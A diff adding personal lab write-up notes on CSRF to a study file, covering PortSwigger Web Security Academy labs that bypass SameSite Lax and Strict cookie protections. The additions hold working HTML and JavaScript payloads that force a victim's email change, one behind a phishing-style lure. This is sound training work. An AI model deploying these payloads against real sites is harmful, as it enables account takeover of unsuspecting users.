@@ -1,5 +1,6 @@
 # CSRF
 
+- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-is-a-site-in-the-context-of-samesite-cookies
 - https://portswigger.net/web-security/csrf/bypassing-token-validation
 - https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
 - https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
@@ -173,3 +174,93 @@ Other interesting proposition from solution to replace listening for load event:
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 ```
 
+## SameSite Lax bypass via method override
+
+No `SameSite` policy with session cookie, so in Chrome it will be defaulted to `Lax` by default (Cookie will not be sent along with POST, UPDATE etc. request by scripts without user click).
+
+For changing email no CSRF tokens are present. 
+
+Simply changing method to GET (in order to bypass `Samesite=Lax`) for email change results in error, but by adding `_method=POST` we can trick symphony to treat this request as `POST`
+
+Additionally for `SameSite=Lax`:
+
+```
+Likewise [for cross-site requests], the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.
+```
+
+So delivered payload must redirect user to the page:
+
+```
+<script>
+    location = "https://0a59002804eaa52182f45caa009800e2.web-security-academy.net/my-account/change-email?email=pwned%40email.com&_method=POST"
+</script>
+```
+
+## SameSite Strict bypass via client-side redirect
+
+Email change request does not care if its POST or GET.
+
+After comment creation we have client side redirection on confirmation page. Copying the code and testing it with little tweaks in browser:
+
+```
+<h1></h1>
+
+<script>
+redirectOnConfirmation = (blogPath) => {
+    const url = new URL(window.location);
+    const postId = url.searchParams.get("postId");
+    document.querySelector("h1").innerText = blogPath + '/' + postId;
+}
+redirectOnConfirmation("/post")
+</script>
+```
+
+I was able to find that this payload should trigger the email change
+
+```
+?postId=../my-account/change-email?email=pwned%40email.com&submit=1
+```
+
+Payload for victim (`?` and `&` nned to be encoded for them to get pass through to the second page as parameters and not get interpreted as such here):
+
+```
+<script>
+    location = "https://0a5b006603a1708f80538fe7008100c9.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail=pwned%40email.com%26submit=1"
+</script>
+```
+
+## SameSite Lax bypass via cookie refresh
+
+Logging in to the Application performs `OAuth` flow with start at request to `/social-login` with redirection to login form.
+
+The last request of the flow `/oauth-callback?code=` sets a `session` cookie without `SameSite` applied, so it defaults to `Lax`, but with a catch.
+
+Defaulted `SameSite` to `Lax` have 2 minute windows in which the cookie will be sent with POST requests, in order to not break an OAuth flows.
+
+Changing email feature does not require any random secrets, so it is vulnerable to CSRF.
+
+Accessing `/social-login` again when logged in will set new `session` cookie regardless if we are logged in, giving us new 2 minute windows to perform our CSRF.
+
+Payload for victim:
+```
+<!-- Changing email form -->
+<form method="POST" action="https://0af3007a037099168164c31f00d500b0.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@email.com">
+</form>
+
+<a>Click here to gain your new IPhone!</a>
+
+<script>
+    <!-- Bypass pop up blocker. Open reseting session cookie tab on user click -->
+    window.onclick = () => {
+        window.open('https://0af3007a037099168164c31f00d500b0.web-security-academy.net/social-login');
+        
+        <!-- Wait until session cookie is reset and perform changing email CSRF -->
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
